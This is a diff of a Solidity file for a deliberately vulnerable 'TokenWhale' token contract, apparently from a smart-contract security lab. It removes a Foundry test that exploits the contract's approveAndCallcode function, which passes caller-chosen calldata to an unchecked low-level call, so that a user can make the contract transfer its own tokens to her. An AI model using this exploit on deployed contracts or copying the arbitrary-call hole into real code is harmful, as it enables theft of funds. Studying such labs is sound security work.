@@ -1,50 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.18;
 
-import "forge-std/Test.sol";
-
-contract ContractTest is Test {
-    TokenWhale TokenWhaleContract;
-
-    function testAltCall() public {
-        address alice = vm.addr(1);
-        TokenWhaleContract = new TokenWhale();
-        TokenWhaleContract.TokenWhaleDeploy(address(TokenWhaleContract));
-        console.log(
-            "TokenWhale balance:",
-            TokenWhaleContract.balanceOf(address(TokenWhaleContract))
-        );
-
-        // bytes memory payload = abi.encodeWithSignature("transfer(address,uint256)",address(alice),1000);
-
-        console.log(
-            "Alice calls approveAndCallcode on TokenWhaleContract"
-        );
-        vm.prank(alice);
-        TokenWhaleContract.approveAndCallcode(
-            address(TokenWhaleContract),
-            0x1337,
-            abi.encodeWithSignature(
-                "transfer(address,uint256)",
-                address(alice),
-                1000
-            )
-        );
-
-        assertEq(TokenWhaleContract.balanceOf(address(alice)), 1000);
-        console.log("operate completed");
-        console.log(
-            "TokenWhale balance:",
-            TokenWhaleContract.balanceOf(address(TokenWhaleContract))
-        );
-        console.log(
-            "Alice balance:",
-            TokenWhaleContract.balanceOf(address(alice))
-        );
-    }
-
-    receive() external payable {}
-}
 
 contract TokenWhale {
     address player;
@@ -115,6 +71,5 @@ contract TokenWhale {
         bool success;
 
         (success, ) = _spender.call(_extraData);
-        console.log("success:", success);
     }
 }
